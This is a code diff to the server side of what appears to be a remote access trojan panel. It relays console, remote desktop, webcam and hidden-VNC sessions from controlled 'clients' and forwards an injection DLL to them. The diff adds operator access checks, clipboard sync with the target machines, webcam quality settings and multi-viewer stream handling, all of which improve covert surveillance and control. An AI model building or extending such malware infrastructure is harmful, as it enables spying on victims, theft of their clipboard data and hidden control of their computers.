@@ -11,6 +11,7 @@ import { resolveRuntimeRoot } from "./runtime-paths";
 import * as sessionManager from "../sessions/sessionManager";
 import type { ConsoleSession, RemoteDesktopViewer, SocketData } from "../sessions/types";
 import type { ClientInfo } from "../types";
+import { canUserAccessClient } from "../users";
 
 let _cachedInjectionDll: Uint8Array | null = null;
 let _dllCachePath: string | null = null;
@@ -120,6 +121,8 @@ function buildViewerFrameBuffer(bytes: Uint8Array, header?: any): Uint8Array {
   return buf;
 }
 
+const VIEWER_BACKPRESSURE_BYTES = 4 * 1024 * 1024; // 4 MB
+
 function broadcastFrameToViewers(
   sessions: Iterable<{ viewer: ServerWebSocket<SocketData> }>,
   buf: Uint8Array,
@@ -130,6 +133,10 @@ function broadcastFrameToViewers(
   const byteLen = buf.length;
   for (const session of sessions) {
     try {
+      const buffered = session.viewer.getBufferedAmount?.() ?? 0;
+      if (buffered > VIEWER_BACKPRESSURE_BYTES) {
+        continue;
+      }
       session.viewer.send(buf);
       metrics.recordBytesSent(byteLen);
       sent = true;
@@ -236,13 +243,17 @@ export function stopConsoleOnTarget(target: ClientInfo | undefined, sessionId: s
 
 export function notifyConsoleClosed(clientId: string, reason: string) {
   for (const session of sessionManager.getConsoleSessionsByClient(clientId)) {
-    safeSendViewer(session.viewer, { type: "status", status: "closed", reason, sessionId });
+    safeSendViewer(session.viewer, { type: "status", status: "closed", reason, sessionId: session.id });
     sessionManager.deleteConsoleSession(session.id);
   }
 }
 
 export function handleConsoleViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId, sessionId } = ws.data;
+  const { clientId, sessionId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const effectiveSessionId = sessionId || uuidv4();
   ws.data.sessionId = effectiveSessionId;
   const target = clientManager.getClient(clientId);
@@ -261,13 +272,17 @@ export function handleConsoleViewerOpen(ws: ServerWebSocket<SocketData>) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId: effectiveSessionId });
     return;
   }
-  safeSendViewer(ws, { type: "status", status: "connecting", sessionId: effectiveSessionId });
   startConsoleForViewer(target, effectiveSessionId);
 }
 
 export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
+  ws.data.sessionId = sessionId;
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
   sessionManager.addRdSession(session);
@@ -301,12 +316,27 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
     return;
   }
 
-  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false };
+  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0 };
 
   logger.debug(`[rd] inbound viewer msg type=${payload.type} client=${clientId}`);
   switch (payload.type) {
     case "desktop_start":
       if (!state.isStreaming) {
+        if (target.os === "darwin" && target.permissions) {
+          const missing: string[] = [];
+          if (!target.permissions.screenRecording) missing.push("screenRecording");
+          if (!target.permissions.accessibility) missing.push("accessibility");
+          if (missing.length > 0) {
+            logger.info(`[rd] macOS permission gate: client ${clientId} missing ${missing.join(", ")}`);
+            safeSendViewer(ws, {
+              type: "status",
+              status: "permissions_denied",
+              missing,
+              permissions: target.permissions,
+            });
+            break;
+          }
+        }
         sendDesktopCommand(target, "desktop_start", {});
         state.isStreaming = true;
         rdStreamingState.set(clientId, state);
@@ -315,17 +345,24 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
         logger.debug(`[rd] ignoring duplicate desktop_start for client ${clientId}`);
       }
       break;
-    case "desktop_stop":
-      sendDesktopCommand(target, "desktop_stop", {});
-      if (state.isStreaming) {
-        state.isStreaming = false;
-        rdStreamingState.set(clientId, state);
-        logger.debug(`[rd] stopped streaming for client ${clientId}`);
+    case "desktop_stop": {
+      const otherViewers = sessionManager.getRdSessionsForClient(clientId)
+        .filter(s => s.id !== ws.data.sessionId);
+      if (otherViewers.length === 0) {
+        sendDesktopCommand(target, "desktop_stop", {});
+        if (state.isStreaming) {
+          state.isStreaming = false;
+          rdStreamingState.set(clientId, state);
+          logger.debug(`[rd] stopped streaming for client ${clientId}`);
+        } else {
+          rdStreamingState.set(clientId, { ...state, isStreaming: false });
+          logger.debug(`[rd] stop requested while not streaming for client ${clientId}`);
+        }
       } else {
-        rdStreamingState.set(clientId, { ...state, isStreaming: false });
-        logger.debug(`[rd] stop requested while not streaming for client ${clientId}`);
+        logger.debug(`[rd] ignoring desktop_stop for client ${clientId} - ${otherViewers.length} other viewer(s) still active`);
       }
       break;
+    }
     case "desktop_select_display": {
       const newDisplay = Number(payload.display) || 0;
       if (state.display !== newDisplay) {
@@ -434,6 +471,23 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
       sendDesktopCommandWithId(target, "desktop_text", { text: payload.text || "" }, commandId);
       break;
     }
+    case "clipboard_sync": {
+      if (!state.isStreaming) break;
+      const text = String(payload.text || "");
+      if (text) {
+        sendDesktopCommand(target, "clipboard_set", { text });
+      }
+      break;
+    }
+    case "clipboard_sync_start": {
+      if (!state.isStreaming) break;
+      sendDesktopCommand(target, "clipboard_sync_start", { source: "rd" });
+      break;
+    }
+    case "clipboard_sync_stop": {
+      sendDesktopCommand(target, "clipboard_sync_stop", {});
+      break;
+    }
     default:
       break;
   }
@@ -443,7 +497,7 @@ function handleRemoteDesktopFrame(payload: any) {
   const clientId = payload.clientId as string;
   const header = payload.header;
   const bytes = payload.data as Uint8Array;
-  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false };
+  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0 };
   if (!state.isStreaming) {
     rdStreamingState.set(clientId, { ...state, isStreaming: true });
   }
@@ -457,11 +511,16 @@ function handleRemoteDesktopFrame(payload: any) {
 };
 
 export const hvncStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number; codec: string }>();
-export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean }>();
+export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean; quality: number; codec: string }>();
 
 export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
+  ws.data.sessionId = sessionId;
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
   sessionManager.addWebcamSession(session);
@@ -505,11 +564,17 @@ export function handleHVNCLookupResult(clientId: string, payload: any) {
 }
 
 export function handleClipboardContent(clientId: string, payload: any) {
-  for (const session of sessionManager.getConsoleSessionsByClient(clientId)) {
-    safeSendViewer(session.viewer, {
-      type: "clipboard_content",
-      content: String(payload.content ?? ""),
-    });
+  const text = String(payload.text || "");
+  const source = String(payload.source || "");
+  if (!text) return;
+  if (source === "hvnc") {
+    for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+      safeSendViewer(session.viewer, { type: "clipboard_content", text, source });
+    }
+  } else {
+    for (const session of sessionManager.getRdSessionsForClient(clientId)) {
+      safeSendViewer(session.viewer, { type: "clipboard_content", text, source });
+    }
   }
 }
 
@@ -523,7 +588,7 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
     return;
   }
 
-  const state = webcamStreamingState.get(clientId) || { isStreaming: false, deviceIndex: 0, fps: 30, useMax: false };
+  const state = webcamStreamingState.get(clientId) || { isStreaming: false, deviceIndex: 0, fps: 30, useMax: false, quality: 90, codec: "" };
   switch (payload.type) {
     case "webcam_list":
       sendDesktopCommand(target, "webcam_list", {});
@@ -555,24 +620,46 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
     case "webcam_start":
       if (!state.isStreaming) {
         sendDesktopCommand(target, "webcam_set_fps", { fps: state.fps, useMax: state.useMax });
+        sendDesktopCommand(target, "webcam_set_quality", { quality: state.quality, codec: state.codec });
         sendDesktopCommand(target, "webcam_start", {});
         state.isStreaming = true;
         webcamStreamingState.set(clientId, state);
       }
       break;
-    case "webcam_stop":
-      sendDesktopCommand(target, "webcam_stop", {});
-      state.isStreaming = false;
+    case "webcam_set_quality": {
+      const quality = Math.max(0, Math.min(100, Number(payload.quality) || 0));
+      const codec = String(payload.codec || "").toLowerCase();
+      state.quality = quality;
+      state.codec = codec;
       webcamStreamingState.set(clientId, state);
+      sendDesktopCommand(target, "webcam_set_quality", { quality, codec });
       break;
+    }
+    case "webcam_stop": {
+      const otherWebcamViewers = sessionManager.getWebcamSessionsForClient(clientId)
+        .filter(s => s.id !== ws.data.sessionId);
+      if (otherWebcamViewers.length === 0) {
+        sendDesktopCommand(target, "webcam_stop", {});
+        state.isStreaming = false;
+        webcamStreamingState.set(clientId, state);
+      } else {
+        logger.debug(`[webcam] ignoring webcam_stop for client ${clientId} - ${otherWebcamViewers.length} other viewer(s) still active`);
+      }
+      break;
+    }
     default:
       break;
   }
 }
 
 export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
+  ws.data.sessionId = sessionId;
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
   sessionManager.addHvncSession(session);
@@ -622,14 +709,21 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         logger.debug(`[hvnc] ignoring duplicate hvnc_start for client ${clientId}`);
       }
       break;
-    case "hvnc_stop":
-      if (state.isStreaming) {
-        sendHVNCCommand(target, "hvnc_stop", {});
-        state.isStreaming = false;
-        hvncStreamingState.set(clientId, state);
-        logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
+    case "hvnc_stop": {
+      const otherHvncViewers = sessionManager.getHvncSessionsForClient(clientId)
+        .filter(s => s.id !== ws.data.sessionId);
+      if (otherHvncViewers.length === 0) {
+        if (state.isStreaming) {
+          sendHVNCCommand(target, "hvnc_stop", {});
+          state.isStreaming = false;
+          hvncStreamingState.set(clientId, state);
+          logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
+        }
+      } else {
+        logger.debug(`[hvnc] ignoring hvnc_stop for client ${clientId} - ${otherHvncViewers.length} other viewer(s) still active`);
       }
       break;
+    }
     case "hvnc_select_display": {
       const newDisplay = Number(payload.display) || 0;
       if (state.display !== newDisplay) {
@@ -741,6 +835,23 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         killIfRunning: payload.killIfRunning === true,
         dll: dllData,
       });
+      break;
+    }
+    case "clipboard_sync": {
+      if (!state.isStreaming) break;
+      const text = String(payload.text || "");
+      if (text) {
+        sendHVNCCommand(target, "clipboard_set", { text });
+      }
+      break;
+    }
+    case "clipboard_sync_start": {
+      if (!state.isStreaming) break;
+      sendDesktopCommand(target, "clipboard_sync_start", { source: "hvnc" });
+      break;
+    }
+    case "clipboard_sync_stop": {
+      sendDesktopCommand(target, "clipboard_sync_stop", {});
       break;
     }
     default:
